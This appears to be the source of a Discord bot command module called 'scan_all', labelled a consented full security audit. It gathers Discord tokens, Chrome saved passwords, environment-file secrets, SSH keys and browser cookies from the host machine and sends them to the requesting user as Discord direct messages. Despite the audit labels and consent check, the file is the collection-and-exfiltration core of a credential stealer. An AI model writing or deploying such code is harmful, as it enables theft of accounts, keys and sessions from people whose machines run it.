import discord
from discord.ext import commands
from core.consent_manager import ConsentManager
from core.token_scanner import TokenScanner
from core.password_scanner import PasswordScanner
from core.env_scanner import EnvScanner
from core.ssh_scanner import SSHScanner
from core.cookie_scanner import CookieScanner
from core.reporter import Reporter

class ScanAllCommand(commands.Cog):
    """Full security audit command"""
    
    def __init__(self, bot):
        self.bot = bot
        self.consent_mgr = ConsentManager()
        self.reporter = Reporter()
        self.token_scanner = TokenScanner()
        self.password_scanner = PasswordScanner()
        self.env_scanner = EnvScanner()
        self.ssh_scanner = SSHScanner()
        self.cookie_scanner = CookieScanner()
    
    @commands.command(name='scan_all')
    async def scan_all(self, ctx):
        """Run full security audit"""
        user_id = ctx.author.id
        
        if not self.consent_mgr.has_consent(user_id, 'all'):
            await ctx.author.send("❌ Full audit requires all consent! Use `!consent_all`")
            return
        
        await ctx.author.send("🔍 Running FULL SECURITY AUDIT... This may take a moment...")
        
        try:
            results = {
                "tokens": self.token_scanner.scan_discord_tokens(),
                "passwords": self.password_scanner.scan_chrome_passwords(),
                "env_secrets": self.env_scanner.scan_env_files(),
                "ssh_keys": self.ssh_scanner.scan_ssh_keys(),
                "cookies": self.cookie_scanner.scan_browser_cookies()
            }
            
            report = self.reporter.create_report(user_id, results)
            formatted = self.reporter.format_report(report)
            
            # Send report in chunks if too large
            if len(formatted) > 2000:
                chunks = [formatted[i:i+1900] for i in range(0, len(formatted), 1900)]
                for chunk in chunks:
                    await ctx.author.send(f"```\n{chunk}\n```")
            else:
                await ctx.author.send(f"```\n{formatted}\n```")
            
            self.consent_mgr.log_consent(user_id, 'all', True, "Full audit completed")
        except Exception as e:
            await ctx.author.send(f"❌ Error during audit: {str(e)}")

async def setup(bot):
    await bot.add_cog(ScanAllCommand(bot))
